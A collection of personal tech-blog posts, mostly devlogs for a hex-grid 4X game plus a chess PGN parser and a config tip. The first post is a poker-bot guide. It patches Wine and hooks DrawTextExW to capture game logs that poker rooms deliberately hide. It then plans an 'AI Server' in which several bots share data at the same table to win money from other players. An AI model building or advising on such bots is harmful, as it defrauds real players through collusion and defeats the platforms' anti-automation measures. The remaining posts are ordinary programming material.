ERROR_SUCCESS || type != REG_SZ)\n+               goto profile_error;\n+\n+       /* And finally the docking state */\n+       ret = RegGetValueA(hkey, \"CurrentDockInfo\", \"DockingState\", RRF_RT_DWORD,\n+                          &type, &pInfo->dwDockInfo, &size);\n+\n+       if (ret != ERROR_SUCCESS || size != 4 || type != REG_DWORD)\n+               goto profile_error;\n+\n+       /* Success */\n+      profile_result = 1;\n+\n+profile_error:\n+       RegCloseKey(hkey);\n+      return profile_result;\n}\n\n/******************************************************************************\ndiff -uNr wine-0.9.30-fe/tools/wine.inf wine-0.9.30-fe-patched/tools/wine.inf\n--- wine-0.9.30-fe/tools/wine.inf\t2007-01-25 07:53:50.000000000 -0800\n+++ wine-0.9.30-fe-patched/tools/wine.inf\t2007-02-22 16:51:03.000000000 -0800\n@@ -237,6 +237,22 @@\nHKLM,System\\CurrentControlSet\\Control\\Session Manager\\Environment,\"windir\",,\"%10%\"\nHKLM,System\\CurrentControlSet\\Control\\Session Manager\\Environment,\"winsysdir\",,\"%11%\"\n\n+[IDConfigDB]\n+HKLM,System\\CurrentControlSet\\Control\\IDConfigDB,\"CurrentConfig\",,0x00000000\n+HKLM,System\\CurrentControlSet\\Control\\IDConfigDB,\"UserWaitInterval\",,0x0000001e\n+HKLM,System\\CurrentControlSet\\Control\\IDConfigDB,\"IsPortable\",,0x00000000\n+HKLM,System\\CurrentControlSet\\Control\\IDConfigDB\\Alias\\0000,\"DockingState\",,0x00000000\n+HKLM,System\\CurrentControlSet\\Control\\IDConfigDB\\Alias\\0000,\"Capabilities\",,0x00000000\n+HKLM,System\\CurrentControlSet\\Control\\IDConfigDB\\Alias\\0000,\"DockID\",,0x00000000\n+HKLM,System\\CurrentControlSet\\Control\\IDConfigDB\\Alias\\0000,\"SerialNumber\",,0x00000000\n+HKLM,System\\CurrentControlSet\\Control\\IDConfigDB\\Alias\\0000,\"ProfileNumber\",,0x00000000\n+HKLM,System\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles,\"Unknown\",,0x00000000\n+HKLM,System\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0000,\"PreferenceOrder\",,0x00000000\n+HKLM,System\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0000,\"FriendlyName\",,\"Wine Profile\"\n+HKLM,System\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0000,\"Aliasable\",,0x00000000\n+HKLM,System\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0000,\"Cloned\",,0x00000000\n+HKLM,System\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0000,\"HwProfileGuid\",,\"{abba0009-1ed34-1dad4-1333-1e3e4ebb890a}\"\n+\n[Fonts]\nHKLM,%FontSubStr%,\"Arial CE,238\",,\"Arial,238\"\nHKLM,%FontSubStr%,\"Arial CYR,204\",,\"Arial,204\"\n```\n\ncd into the wine source installation directory and apply the patch with\n\n```\npatch -p0 < patch.txt\n```\n\n\nNext you need to install some registry keys. Put the following into a text file and import with regedit file.txt.\n\n```\nREGEDIT4\n[HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\IDConfigDB]\n\"CurrentConfig\"=hex:00,00,00,00\n\"IsPortable\"=hex:00,00,00,00\n\"UserWaitInterval\"=hex:00,00,00,1e\n[HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\IDConfigDB\\Alias]\n[HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\IDConfigDB\\Alias\\0000]\n\"Capabilities\"=hex:00,00,00,00\n\"DockID\"=hex:00,00,00,00\n\"DockingState\"=hex:00,00,00,00\n\"ProfileNumber\"=hex:00,00,00,00\n\"SerialNumber\"=hex:00,00,00,00\n[HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles]\n\"Unknown\"=hex:00,00,00,00\n[HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0000]\n\"Aliasable\"=hex:00,00,00,00\n\"Cloned\"=hex:00,00,00,00\n\"FriendlyName\"=\"Wine Profile\"\n\"HwProfileGuid\"=\"{abba0009-1ed34-1dad4-1333-1e3eb00a890a}\"\n\"PreferenceOrder\"=hex:00,00,00,00\n```\n\nBuild the source code, and install it.\nAfter the installation process this is what you get:\n\n\n\nNow that wine works, we need to hook the text drawing functions to capture the game log and process it.\nNormally this would be an easy task under windows, but the poker rooms use tricks to prevent this from happening.\nThey use custom windows that override the WM_GETTEXT function that should return the contents of a control, and make it return nothing. So we have to hook the text displaying portion of the operating systems API, in this case the wine API.\nThis method resides in the file dlls/user32/text.c. For testing purposes add the following line into DrawTextExW():\n\n```\nFIXME(\"%s, %d, [%s] %08x\\n\", debugstr_wn (str, count), count,\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 wine_dbgstr_rect(rect), flags);\n```\n\nNow save the file and exit. Run the poker room client with wine, and watch the terminal output a lot of messages. Login to your account and sit at a table.\nIf you watch the terminal log, you'll see messages flying by with every little piece of text that is ever drawn on to the wine windows. This includes the game log that we are interested in. Now there are a few problems that we can identify here:\n\n* we don't want to receive messages from the lobby windows, including garbage chat conversations.\n* Poker room developers tried make our lives harder by calling drawText for every word instead of sentences.\n* There are duplicate messages all over the place\n\nThis is a screen shot of where we are now:\n\n![](/img/pokebot.png)\n\n## The Brain\nBefore setting out to code and getting our hands dirty, the most scary part seemed to me the win 32 API stuff, probably because I've been a linux console/web programmer all my life, and i was never into windows and desktop client, especially low level - unmanaged windows API calls. But it seems there are a lot of resources and documents, and even managed code that hooks API calls (discussed in a different chapter). The real beast is the brain, the decision making part, the AI Server.\n\nFirst off before discussing the actual algorithms and techniques, lets dicuss the architecture, and why it is called the AI Server. Simple: we'll have multiple poker room clients, playing on mutliple tables, some times even 2 of our bots playing on the same table, and sharing data, though one might think that this would decrease the winnings, and giving more rake, but this would increase our chances of winning more money from the other players. AI algorithms should be changable and tunable on the fly, and yet per AI Client (the Agent) configurable. The best design decision seemed like a client/server model, where the server was the AI Server, and the clients were the agents, that were the gateway between the AI and the poker room client. The AI Server's architectural crude design is like this:\n[AIServer Diagram in Omnigraffle]\n\nFlexibilty is a key design objective in most of the projects that get designed. This also was the case in the AI Server. Different algorithms had to be pluggable as modules, changeable according to table characteristics (heretic players, tight players, etc.) without the need of recompilation of code.\n\nMulti-thread is a core requirement, because we'll be serving a lot of requests and clients\n\nCheating and using a application container such as tomcat doesn't help because HTTP is a stateless protocol, and poker is a statefull game. The state will have to be carried out by URL parameters or session/cookies which means that the agent will need to implement a HTTP client, which is not worth the effort. Instead we designed our own text based communication protocol. The protocol is TCP and Text based. Very simple, clients send commands and the server threads act accordingly.\n\n", "file": "how_to_pokebot.ipynb"}, {"title": "movement improvements", "body": "\non the last movement post I mentioned some of the improvements that I would be \nmaking to the ship movements. Here is the demo video of some of these improvements.\nThere are still some rough edges as can be seen (like ships passing through \neach other) which I will fix later. There are a few options about fixing \ncolliding ships, I\u2019m thinking of elevating the ship in the +Z axis so it will \nfly over the other ship. Another option would be to select a different route. \nCurrent the way of selecting the hex cells to reach the target is done like this:\n\n![](/img/mi.jpg)\n\nthe yellow line is a direct line between the source and target cells. In the \nprevious movement videos ship were taking this direct route. To rasterize the \nthis route, I select N+1 equally distanced points on the line. N is the hex \ndistance between the two points calculated as `Math.max( x1-x2,y1-y2,z1-z2)`. \nThese points are the green dots on the yellow line. Each of these points will \nfall into a cell on the grid and these are the cells that the ship will follow \nto reach the target, as I highlight them in white. So here is the video of the \nship moving along the grid:\n\n![](/img/h2.gif)\n\n\n", "file": "movement_improvements.ipynb"}, {"title": "typesafe config override", "body": "\nEvery now and then you need to be able to define some default value in your configuration and be able to override them based on the environment you are running in. TypeSafe Config has a nice way of allowing this:\n\n```\nproduction {\n  service1: 172.0.0.1\n  service2: ${?SERV1}\n}\n\n```\n\nwhen you define you config like this if your application start with `-DSERV1=10.0.0.1` then the command line value will override the default in the configuration file.\n", "file": "typesafe-config-override.ipynb"}, {"title": "terrain generation using cellular automata", "body": "\nCellular automata are a nice way of representing natural terrains\nfor game worlds. The idea is that a cell interacts with its neighbor\ncells changing their content, just as a natural process would do. The\nmethod actually stems from biology, where a population interacts with\ntheir neighbors either dying due to scarce resources or thriving by\nmultiplying due to enough mates. The algorithm is pretty simple, each\ncell has a binary state that toggles based on the number of neighbors\nin a state. E.g if the current cell has more than 4 neighbors that are\nalive it will die, otherwise it will live. As you iterate the 2x2 matrix\nof cells an organic pattern starts to emerge which is what we need when\nimitating a terrain of grass. The cells may have more than 2 states, but\nI've used only too to generate a grass land with 2 types of grass tiles.\n\n\n```\n    public boolean[][] run(int width, int height, int death, int birth, int runs) {\n        boolean[][] map = new boolean[height][width];\n        boolean[][] temp = new boolean[height][width];\n\n        for (int i = 0; i < map.length; i++) {\n            for (int j = 0; j < map[0].length; j++) {\n                map[i][j] = Utils.coinFlip();\n                temp[i][j] = map[i][j];\n            }\n        }\n\n        int WIDTH=map[0].length, HEIGHT=map.length;\n\n        for (int k = 0; k < runs; k++) {\n            for (int y = 0; y < HEIGHT-1; y++) {\n                for (int x = 0; x <WIDTH-1; x++) {\n                    int nbs = aliveNeighbors(temp, x, y);\n                    if (temp[y][x]) {\n                        map[y][x] = nbs >= death;\n                    } else {\n                        map[y][x] = nbs > birth;\n                    }\n                }\n            }\n\n            //copy generated to temp for the new run\n            for (int i = 0; i < map.length; i++) {\n                temp[i] = map[i].clone();\n            }\n\n        }\n        return map;\n    }\n```\n\nthe death and birth parameter define how many neighboring alive cells trigger a death\nor a birth. The runs parameter defines how many generations we will process. \n\n```\n   public int aliveNeighbors(boolean[][] map,int x, int y) {\n        int count=0, my = map.length, mx = map[0].length;\n        for (int i = -1; i <2; i++) {\n            for (int j = -1; j < 2; j++) {\n                int nx = x + i;\n                int ny = y + j;\n                if (i == 0 && j == 0) {\n\n                } else if (nx < 0 || ny < 0 || nx > mx || ny > my) {\n                    count++;\n                } else if (map[ny][nx]) {\n                    count++;\n                }\n            }\n        }\n        return count;\n    }\n```\n\nHere is an example output\n\n![](/img/tgwca.png)", "file": "terrain_generation_cellular_automata.ipynb"}, {"title": "epic4x: devlog #11", "body": "\nPosted on March 13, 2017 by dendiz\nSo after a couple days of saving up features to write on the dev log, here is\nwhat\u2019s been happening:\n\nI cleaned up the command processing architecture and added event/state based\nhooks, so now each command has a pre-execute, execute and post execute stage \nthat is called. \n\nSetup/tear down tasks are be done at the pre/post stages and the execution phase \ndoes it\u2019s magic. I also added validation for command\u2192components mappings. \nSo you can\u2019t go around trying to issue a move command to a ship that doesn\u2019t have\nan engine.\n\nIssuing move commands can get confusing when there are 30.000 planets to choose from. \nThe empires will have the location of all stars in the galaxy but they still need\nto survey the system to get specifics. Ships now have a sensor component that will\nlimit the range it can navigate.\n\nI also tidied up the parameters being passed to the endpoints using the great\nspring provided argument resolvers. This makes the controller layer code so\nmuch cleaner, a pleasure to work with. I also went ahead and restructured the \npackage layout by functionality instead of application layers. There is no best\npractice for this so I\u2019m trying out this type of structuring.\n\nNow that the backend processing for commands is in place, the client needed \nsome attention. The client is a prototype but still it needs a nice way to\nenable command input. Also the current command queue of the ships are listed.\n\nI was using random string generator for names which gets a bit complicated when\nlooking at planet/star names for navigation so I thought I\u2019d code a small \nMarkov chain based name generator for stars, planets and ships. \nNow I get names like the Heliak System, Coltar IV, Otein III and ships called \nSiberty. Sometimes it does spit out weird names that sound like elven too though.\n\nI also setup the QA server with automated deployments so that I can have friends \ndo some play testing, even though it\u2019s still too early for that.\n\nI merged the info requests that were made periodically into a single request to\nreduce server load going forward. \n", "file": "epic4x_2017-03-13.ipynb"}, {"title": "avoiding obstacles in path", "body": "\nUp until now there were any obstacles (excluding ship) so I really didn\u2019t care for a proper path finding algorithm to select the cells that the ship would follow to reach it\u2019s target. A simple rasterization of the cells were the way to calculate the path, but since I\u2019ve added some asteroids it I also thought I\u2019d spice up the path finding too.\n\n![](/img/aoip.jpg)\n\nIn this picture the rasterization algorithm would pick the yellow line and the cells with the red dots on them, which are actually obscured by asteroids. The correct path is the path with the purple arrows. How to you choose these? Well luckily there are a couple of ways. The brute force version would be to do a breadth first search to find the target cell which would lead to wasted movements for sure. The next best approach is the select the next cell in the BFS not at random or in order but based on a heuristic, a good guess to which cell would lead quicker to the target cell. The easiest heuristic that comes to mind is the hex distance calculated as Math.max( x2-x1, y2-y1, z2-z1). You also add the total cost of movement to this cell, something that you know for sure. Why do we add the cost of movement? Because we may need a rotation to get to that neighbor cell, which is also a movement cost. So from the starting cell, you look at all the neighbors and calculate the distance to the target cell + the cost of movement to that cell and choose the closest one. You add the current cell to the visited list. Why? because in the next step the current cell will show up as a neighbor, and we don\u2019t want to check that cell again. Then you advanced to that cell and do the same until you have reached your target. Is it possible that the target cell is never found or a ship will be there to block us? No because the target cell validity check is done before hand (the green cells). This is a simplified version of the A-start algorithm. Here it is in action\n\n![](/img/h4.gif)", "file": "avoiding_obstacales_in_path.ipynb"}, {"title": "epic4x: devlog #8", "body": "\nyet more moving code from one class to another in the process of getting a \nbetter code structure with method going to classes in which they make more \nsense. This also means refactoring the tests associated with the old class. \nBut this moving around code phase is done for the time being and it\u2019s not all \nthat was on my agenda today. I also managed to get int around 10 more tests for\nservices that were previously untested and increased the code coverage of the\nservices to around 80%. I also implemented the feature that shuts down \nbuildings if the player does not have the energy to pay their maintenance. \nKind of a \u201cno money no honey\u201d situation. As I was play testing the planet \ntoday I actually realized that if you are unfortunate enough to get a home \nplanet with very little food tiles (say 2-3) then you end up having a very \nhard time in building a population on that planet. Even if you keep building \nfarms after a while you cannot support that many buildings because you run \nout of energy. If you switch the farms to power plants that the population \npoint takes a very sharp dip into the negatives quite fast. Currently this \ndoesn\u2019t have any effect but I will be implementing population happiness soon \nwhich will mean that the populations will be very unhappy if they are starving \nand will stop operating at an optimal level of efficiency. I suppose it\u2019s \nbetter than having all your building shutdown but still in the even further \nfuture these populations will be rebelling against you.", "file": "epic4x_2017-03-03.ipynb"}, {"title": "epic4x: devlog #2", "body": "\nIf you don\u2019t have a population on a surface tile with resources then who will harvest them? \nWell, today I implemented a feature that will allow you to move populations from one tile another.\nIf there is another population on the target tile, then they will swap places with the guys coming in.\nMoving a population to another tile will affect their happiness in a bad way, I don\u2019t know how bad just yet.\nAnother issue was the growth of populations on the planet surface. It works in the following way:\n\n* each planet has a population point\n* this point is increased/decreased based on food surplus on the planet\n* there is a population score that is calculated based on the number of existing populations on the planet\n* if the population points of a planet are > then the population score a new population is born.\n\t\nThe exact formula (each day the population point is adjusted like this):\nx = food surplus (production \u2013 consumption)\nimage was lost\nthe result is added to the current planet population points. if (population points > nextScore) grow new population on an empty tile nextScore is calculated as 1.65p + p^1.12 where p is the current population If a new population spawns it prefers a tile with resources. If none exists then they will settle for an empty tile.\nAnother improvement(!) was in the UI. I added some simple drop down boxes to relocate a population from one tile to another. Yes drag and drop of populations would be nice, but that sort of UI niceness is low priority until the game mechanics are in place.\nimage was lost", "file": "epic4x-2017-02-24.2.ipynb"}, {"title": "epic4x: devlog #3", "body": "\nWhat\u2019s a planet surface without any buildings? A vast empty space. \nBuildings will allow the settlers on a planet to produce different resources \non tiles. Buildings come in various forms: farms, research centers, power \nplants, etc. Each tile can have a building of any type that will produce the \naccording resource. A building on a tile without a population will not produce \nanything and a building will suppress any non matching resources. So if you \nhave a tile with food resource and decide to build a research center on it, \nthen say good bye to the food. Building cost minerals to build and energy to \nmaintain. The output and cost and maintanence cost of building depends on its level.\n\nWith these requirements in mind I set of to implement these features. \nEach buildings cost, maintenance, and building time are kept in source code as\na map of type \u2192 value. Holding these in the DB or configuration file didn\u2019t \nseem worth the trouble as these parameters will be fixed and not change for \ndifferent games. The costs will increase with each level for the building but \nthis will be calculated on the fly so I\u2019m just storing the level 1 costs. \nMaintenance cost and time to complete the building are stored in the database \nfor each instance of a building as they will change as the game progresses.\n\nAs I was working on the building features I realized that the only consumption \non a planet is food and energy. I had written the methods that calculate \nconsumption in a generic way to support querying any type of resource \nconsumption so I simplified that to only food and energy. I also realized that \nI had skipped increasing the player resources by the income amount so I added \nthat too. I would be bad if you saw +3 energy income but you were\u2019nt able to \naccumulate it. The relations between entities are slowly getting upto a point \nwhere it\u2019s beginning to get confusing and changes are beginning to affect a few\nplaces at once. I might start writing down stories and use cases first instead \nof just tracking them mentally which will have a negative impact on speed. \nI\u2019m also trying to keep good test coverage going as these types of changes are \nvery likely to bring up regressive errors.", "file": "epic4x-2017-02-26.ipynb"}, {"title": "epic4x: devlog #1", "body": "\n\nBeing the first development log on this project and having already been working on this for some time, \nit is going to be a jump in the middle of things. Here is roughly what I have\n\n## Player registration\nEach person should be able to play in multiple galaxies at the same time, although these will be isolated games. \nThe required that a person is represented by a User object and this person in a galaxy is represented by a Player object. \nI got to this conclusion after painful trial and errors with the player ending up with ships and resources \nhe had from another galaxy in another galaxy. I\u2019ve left the actual registration process out of scope for the\nmoment and I\u2019m just creating a default user if none exists.\nGalaxy creation\nEach galaxy represents a different game, and there are multiple games going on simultaneously. Galaxies \nare made up of stars systems. The galaxies are in radial form, maybe I might consider adding a spiral\nform \u2013 but not a priority. The different forms of galaxies should affect FTL traveling.\n\n\n## Star systems\nThe galaxy is filled with star systems that are distributed according to a simple density \nfunction so that no 2 systems are within a certain range of each other. Star systems contain \nplanets which the players will exploit and colonize to further their ambitions. Star systems \nare connected by Warp lanes. No system is isolated, meaning that you can travel to any star \nfrom any star.\n\n\n## Planets\nPlanets contain\n  * orbital resources\n  * surface resources\norbital resources will be mined by mining stations, surface resources are collected by colonization of the planet. \nThe planet surface is split up into tiles. Populations and building will be built on these tiles to gather their resources.\n\n\n## Resources\nThere are 5 types: Energy, mineral, society, physics, engineering. Energy and minerals can be stockpiled, \nthe research resources cannot. Buildings, ships etc. will cost resources as will researching technologies.\n\n\n## Ships Designs\nShip designs are blueprints for creating ships. Ships consist of 1 to 3 sections called the core, \nbow, stern section. Each section contains a hull with different slot assignments. Slots may be \nsmall, medium or large and contain components. Components contain attributes and a value for that\nattribute. E.g a power core component contains a power output attribute which a ship will need to\ngenerate power for weapons or survey equipment etc.\n\nThis is a summary of the current progress. Now let\u2019s talk about some of the things I implemented today.\nThe game progresses in turns, which are automatically incremented at 1 turn per 10 seconds on the \nserver side. Each turn planetary resources of the colonized planets are gathered and the costs are\nsubtracted from these. Initially, I had 5 integers representing the resources on the planets, but \nthis turned out to be cumbersome when tallying the resources so I changed this to a ResourceDeposit\nobject with a type and amount attribute on each planet. This way I can just map the amount for an \nattribute type for each planet and just reduce them.\n\nRandom numbers determine quite a bit of how a galaxy is created, but I needed a stable environment\nfor integration testing so I moved the Random class to a spring service which I can seed with a number\nso that it generates the same numbers each time.\n\nWhen a player joins a galaxy some initial processing like creating the template ship designs and \nassigning a home planet must be done. When assigning a home planet an initial population of half \nof the tiles with resources is placed on the best tiles. Best tiles are the tiles with the most \namount of resources independent of the resource type. So it\u2019s pure chance if you end up on tiles \nwith energy or minerals. You can still relocate a population to another tile at any time but that \nwill have a happiness cost which in turn will reduce their productivity for some time.\n\nGather resources from a tile only makes sense if there is a population on it. Also the productivity \nof the population should play a part in what percentage of the resources are gathered per turn, \nsomething is waiting to be implemented. Also added some simple client UI to see the summary and the \nsurface tiles of a planet, check the image attachments on the page at the bottom. It\u2019s fun to see how \nthe UI evolves over time. One thing to mention when developing the UI is the importance of persisting \nthe logged in user session, so that you don\u2019t have to login every time you restart the application. \nI used to use in memory maps to persist session data but after a short while having to login constantly \ngets annoying so now I default to persisting sessions to the DB or maybe Memcache/Couchbase when \nrunning in production.\n\nHere is how all this stuff is linked together in the DB\n\n![](/img/ep4xdl1-2.jpeg)\n\n![](/img/ep4xdl1-1.jpeg)\n\n", "file": "epic4x-2017-02-24.ipynb"}, {"title": "pgn parser with comments and recursive variations support", "body": "\nPGN files are the standard way chess games are transmitted across the net. So any chess program that needs to replay or process a game needs to be able to read the PGN format.\nThere are very many different PGN parsers around in different programming languages. Most of them try to process the PGN using regexes, or just reduce the data to the main\nline moves, event discarding the comments and annotations. This may be OK if you are processing the game for purposes of machine consumption as the comments don't mean\nanything to a machine but I wanted to write a parser that preserves the comments and the recursive variations. \n\nSo the first part of any non trivial parser is going to be a \"Lexer\" that tokenizes the input. Check out the PGN formal grammar for \nANTLR (https://github.com/antlr/grammars-v4/blob/master/pgn/PGN.g4) that has a details. \nIt's a good idea to use this ANTLR code to if you don't want to fiddle with insides of a parser. \n\nSo the lexer will consume the input character by character creating tokens from this input. Here is the token class that I used:\n\n<pre>\n    public class Token\n    {\n        public string Type { get; }\n        public string Value { get; }\n        public const string MoveNumber = \"MoveNumber\";\n        public const string SAN = \"SAN\";\n        public const string Comment = \"Comment\";\n        public const string EOF = \"EOF\";\n        public const string Result = \"Result\";\n        public const string Header = \"Header\";\n        public const string NAG = \"NAG\";\n        public const string LPAREN = \"LPAREN\";\n        public const string RPAREN = \"RPAREN\";\n        public Token(string type, string value)\n        {\n            Type = type;\n            Value = value.Replace(\"\\n\", \"\");\n        }\n\n        public override string ToString()\n        {\n            return \"Token \" + Type + \" \" + Value;\n        }\n    }\n</pre>\n\nWe need to treat the left parenthesis and the right one as individual tokens as they will have a special meaning when we are creating the syntax tree. \n\nDiving deeper into the Lexer:\n\n<pre>\n        private int _position = 0;\n        private Char _currentChar;\n        private string _text;\n        private Boolean _lexingDone;\n\n        public PgnLexer(string pgnText)\n        {\n            _text = pgnText;\n            if (_text.Length > 0)\n                _currentChar = _text[_position];\n        }\n</pre>\n\npretty simple, we need to do some book keeping - the current character pointer and the input data is stored.\n\n<pre>\n        private void Advance()\n        {\n            _position += 1;\n            if (_position >= _text.Length)\n            {\n                _lexingDone = true;\n            }\n            else\n            {\n                _currentChar = _text[_position];\n            }\n        }\n</pre>\n\neach time we consume a character the Advance() method will increment the pointer and check if all the input has been consumed. \n\n<pre>\n        private void SkipWhitespace()\n        {\n            while (!_lexingDone && \n                   (Char.IsWhiteSpace(_currentChar) || \n                                    _currentChar == '.' || \n                                    _currentChar == '\\n'))\n            {\n                Advance();\n            }\n        }\n</pre>\nSome PGN files are transcribed by humans and contain multiple whitespaces, some are computer programs inserting optional white spaces for\nbetter readability etc. The '.' character is also treaded as a white space as the move indication \"2... c4\" has multiple '.'\ncharacters that we'll skip.\n\n<pre>\n        public Token GetNextToken()\n        {\n            string result = \"\";\n            while (!_lexingDone)\n            {\n                //result += _currentChar;\n                if (_currentChar == '(')\n                {\n                    Advance();\n                    SkipWhitespace();\n                    return new Token(Token.LPAREN, result);\n                }\n\n                if (_currentChar == ')' && result.Trim().Equals(\"\"))\n                {\n                    Advance();\n                    SkipWhitespace();\n                    return new Token(Token.RPAREN, result);\n                }\n\n                if (_currentChar == '[')\n                {\n                    Advance();\n                    while (_currentChar != ']')\n                    {\n                        result += _currentChar;\n                        Advance();\n                    }\n                    Advance();\n                    SkipWhitespace();\n                    return new Token(Token.Header, result);\n                }\n                if (_currentChar == '.')\n                {\n                    SkipWhitespace();\n                    return new Token(Token.MoveNumber, result);\n                }\n\n                if (_currentChar == '{')\n                {\n                    while (_currentChar != '}')\n                    {\n                        Advance();\n                        result += _currentChar;\n                    }\n                    Advance();\n                    return new Token(Token.Comment, result.Replace(\"{\",\"\").Replace(\"}\",\"\"));\n                }\n\n                if ( (_currentChar == '\\n' ||_currentChar == ' ' || _currentChar == ')') && !result.Trim().Equals(\"\"))\n                {\n                    SkipWhitespace();\n                    result = result.Trim().Replace(\" \", \"\").Replace(\"\\n\", \"\");\n                    if (result.Equals(\"1-0\") || result.Equals(\"0-1\") || result.Equals(\"1/2-1/2\") || result.Equals(\"*\"))\n                        return new Token(Token.Result, result);\n                    if (result.StartsWith(\"$\"))\n                    {\n                        return new Token(Token.NAG, result);\n                    }\n                    return new Token(Token.SAN, result);\n                }\n\n                result += _currentChar;\n                Advance();\n\n            }\n            if (result.Equals(\"\"))\n                return new Token(Token.EOF, \"\");\n            return new Token(Token.Result, result);\n        }\n</pre>\n\nthis is the real part that does the tokenization. Parenthesis type characters are consumed until the matching one is found, \notherwise we consume until we reach a character that terminates a move element and return the resulting token. \nIf we have consumed all the input we return the game result. Some PGN files may have extra white spaces at the end, \nso we return an EOF token if that's the case.\n\n\nNow that we can fetch the tokens from the file, we need to construct a tree representing the moves, comments, variations etc. in the PGN file. \n\n<pre>\n        private readonly PgnLexer _lexer;\n        private Token _currentToken;\n\n        public PgnParser(PgnLexer lexer)\n        {\n            _lexer = lexer;\n            _currentToken = lexer.GetNextToken();\n        }\n</pre>\n\nWe need to track the currentToken and pass a reference to our lexer to fetch more tokens. \n\nThis method will \"eat\" through the tokens and allow us to move forward in the processing:\n\n<pre>\n        private void Eat(string tokenType)\n        {\n            if (_currentToken.Type.Equals(tokenType))\n            {\n                _currentToken = _lexer.GetNextToken();\n            }\n            else\n            {\n                throw new Exception(\"Invalid syntax\");\n            }\n        }\n</pre>\n\nTake for example this made up PGN move text:\n\n\"1.e4 (11. f3 (111. f4 a7) a6) 1... e5 2.f4 exf4 (220... exf3) (221... exf2) 3.Nf3 g5 4.h4 ...\"\n\n(The move numbers are not correct even the moves may be illegal but the purpose is to illustrate the tree that we are aiming to build.)\n\nWe want to transform this into the following tree:\n\n\n![image http://forum.dizman.org/assets/images/1-P17kH330Z1CMJ5qF.png](/img/1-P17kH330Z1CMJ5qF.png)\n\nAll vertical connections are the next node connections and the horizontal connections are the variation connections. So \"e4\" move spawns a variation \nthat it self has an embedded variation (hence the name recursive variations). The move \"exf4\" spawns 2 variations at this move. \n\nSo we start with a method to transform the current token to a node:\n\n<pre>\n private Node Element()\n        {\n            if (_currentToken.Type.Equals(Token.SAN))\n            {\n                Node node = new SanNode();\n                node.Value = _currentToken.Value;\n                return node;\n            }\n\n            if (_currentToken.Type.Equals(Token.Result))\n            {\n                return new ResultNode();\n            }\n\n            if (_currentToken.Type.Equals(Token.MoveNumber))\n            {\n                var node = new MoveNumberNode();\n                node.Value = _currentToken.Value;\n                return node;\n            }\n\n            if (_currentToken.Type.Equals(Token.Header))\n            {\n                var node = new HeaderNode();\n                node.Value = _currentToken.Value;\n                return node;\n\n            }\n\n            if (_currentToken.Type.Equals(Token.Comment))\n            {\n                var node = new CommentNode();\n                node.Value = _currentToken.Value;\n                return node;\n            }\n            {\n                var node = new NullNode();\n                return node;\n            }\n\n        }\n</pre>\n\nSo first the code to build the tree\n\n<pre>\n        private Stack<Node> _stack = new Stack<Node>();\n\n        private Node BuildTree(Node node)\n        {\n            Node root = node;\n            Node prevNode = node;\n            while (true)\n            {\n                Console.WriteLine(_currentToken);\n                if (_currentToken.Type.Equals(Token.EOF))\n                {\n                    return null;\n                }\n                var currentNode = Element();\n                if (currentNode.GetType() == typeof(ResultNode))\n                {\n                    Eat(_currentToken.Type);\n                    prevNode.Next = currentNode;\n                    return root;\n                }\n\n\n                if (_currentToken.Type.Equals(Token.LPAREN))\n                {\n                    _stack.Push(prevNode);\n                    prevNode.Next = currentNode;\n                    prevNode = prevNode.Next;\n                }\n\n                else if (_currentToken.Type.Equals(Token.RPAREN))\n                {\n                    prevNode.Next = currentNode;\n                    var t = _stack.Pop();\n                    t.Variations.Add(t.Next);\n                    prevNode = t;\n                    prevNode.Next = null;\n                }\n                else\n                {\n                    prevNode.Next = currentNode;\n                    prevNode = prevNode.Next;\n                }\n                Eat(_currentToken.Type);\n            }\n\n\n        }\n</pre>\n\nThe algorithm is as follows:\n\n- Get the node type for the current token.\n- if it's a termination token return.\n- if it's not a LPAREN just eat the token and link the previous token to the current token.\n- if it's a LPAREN it means we are starting a recursive variation annotation (RVA). So push the previous node on the stack. Once we are done with the variation, we'll need to get this node back and continue the main line. Continue linking the next node to this node as if we were not in the RVA.\n- it we see a RPAREN pop the node on the stack and add the next pointer nodes to the variations list. Set the previous node to this node, and delete the next pointer for this node. \n\nSo if we walk through an example move text of \"1. e4 (11. f3 a7) 1...e5 2.Nf3\" this is node state and stack state just before the RPAREN:\n\n\n![image http://forum.dizman.org/assets/images/1-awbP4CgiRNjLcGHB.png](/img/1-awbP4CgiRNjLcGHB.png)\n\nWhen we process the RPAREN we will pop the \"e4\" node from the stack, move the next pointers nodes to the variations, delete the next pointer and set the previous node to e4 and continue processing. \n\n\n![image http://forum.dizman.org/assets/images/1-XnoB3aI53wls76dH.png](/img/1-XnoB3aI53wls76dH.png)\n\nThere the tree with embedded variations. The code I use actually takes care of further evaluating the tree into the chess model I use in the application by \nchecking if the move in the PGN is valid, and adding the comments to the move etc. But this is the basics of parsing the PGN file. \n", "file": "pgn-parser-recursive.ipynb"}, {"title": "discovering enemy units and planets", "body": "\nAt first I though that the game could be a game of perfect information where you know where all the planets are and where your enemies are based. But then first I made the planets invisible so you have to explore around to find planets to colonize. Then I though well I\u2019ll also make the enemies invisible until you scan them. The procedure is quite simple: Every ship and planet has a set property called exploredBy. When creating the units you add yourself to the set. Then during the Update() call of every ship in transit you scan the neighboring cells with a radius of N and if there is anything on that cell you add yourself to their explored list and make them visible. Setting a sight line of 1 is okay for planets but could be dangerous for enemy ships as you would end up right in the middle if you go the max distance. So setting this to 2 or 3 is going to better I guess. But this is also a tactical choice: Do you spend all your power on the engines and have nothing attack/defense when you end up in the attacking range of an enemy ship, or do you travel less but have your guard up?\n\nHere is the new stuff in action on a very small map for testing purposes\n\n![](/img/h9.gif)", "file": "discovering_enemy_units_and_planets.ipynb"}, {"title": "planets and some info panels", "body": "\nover the weekend I\u2019ve added some planets to the grid. That was straight forward, find some nice planet surface textures and apply them on to a sphere. The info panels for the planets were GUI text at first with a canvas etc. But if you rotate these along the X-axis so that they lay flat on the grid the font rendering gets 